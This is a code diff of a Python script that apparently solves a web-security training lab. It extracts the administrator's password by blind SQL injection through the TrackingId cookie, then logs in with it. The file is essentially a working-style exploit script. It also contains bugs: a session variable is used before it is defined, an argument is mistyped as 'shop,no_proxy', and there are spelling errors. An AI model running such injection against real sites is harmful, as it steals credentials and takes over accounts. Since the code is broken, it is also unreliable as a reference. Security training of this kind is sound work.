@@ -57,14 +57,25 @@ class MySQLi(SQLi):
 def main(args):
     sess = requests.Session()
     shop = Shop(args.url, args.no_proxy, session)
-    session = requests.Session()
-    inner_query = "SELECT password from users where username = 'administrator'"
-    respone_string = get_response_string(
-        inner_query, shop.base_url, shop.no_proxy, num_threads
-        )
-    log.info(f"Response is: {respone_string}")
-    shop.login("administrator", respone_string)
+    log.info("Getting tracking id and session tocen.")
+    if args.no_proxy:
+        resp = requests.get(shop.base_url)
+    else:
+        resp = requests.get(shop.base_url, proxies=utils.PROXIES, verify=False)
+    tracking_id = resp.cookies["TrackingId"]
+    session_token = resp.cookies["session"]
+    log.info(f"TrackingId: {tracking_id}")
+    sqli = MySQLi(tracking_id, session_token)
+    password = sqli.get_response_string(
+        "SELECT password from users where username = 'administrator'",
+        shop.base_url,
+        shop,no_proxy,
+        10,
+    )
+    log.info(f"Received password: {password}")
+    shop.login("administrator", password)
     shop.is_solved()
+    
 if __name__ == "__main__":
     args = utils.parse_args(sys.argv)
     main(args)
